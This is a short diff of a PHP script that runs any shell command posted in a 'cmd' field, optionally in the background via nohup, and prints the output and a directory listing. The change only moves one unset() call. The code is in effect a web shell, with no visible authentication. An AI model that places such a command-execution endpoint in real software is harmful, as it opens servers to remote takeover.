@@ -20,7 +20,6 @@ if (isset($_POST['cmd'])) {
         $trim = 'nohup '.$trim.' > /dev/null 2>&1 & echo $!';
     }
 
-    unset($output);
     exec($trim, $output);
     echo '<pre>';
     foreach ($output as $line) {
@@ -30,6 +29,7 @@ if (isset($_POST['cmd'])) {
 }
 
 echo '<hr>';
+unset($output);
 exec('ls -la', $output);
 echo '<pre>';
 foreach ($output as $line) {
